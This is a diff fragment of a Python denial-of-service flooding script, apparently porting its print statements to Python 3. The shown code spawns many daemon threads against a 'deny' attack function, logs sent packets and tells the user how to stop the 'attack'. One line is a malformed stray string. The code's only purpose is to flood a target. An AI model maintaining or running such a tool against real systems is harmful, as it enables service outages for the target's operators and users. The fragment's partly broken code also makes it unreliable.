@@ -78,19 +78,17 @@ while True:
         error +=1
         print(pink + f"[LOG] PACKETS {error}")
         "print(cyan + f( DDoS)"
-        print "CTRL+C to stop attack"
+        print("CTRL+C to stop attack")
 
     #Thread spawner
     for n in range(numberthreads):
         thread = threading.Thread(target=deny)
         thread.daemon = True
         thread.start()
-
         threads.append(thread)
 
     #In progress!
-    print "Sending..."
-
+    print("Sending...")
     #Keep alive so ctrl+c still kills all them threads
     while True:
         time.sleep(1)
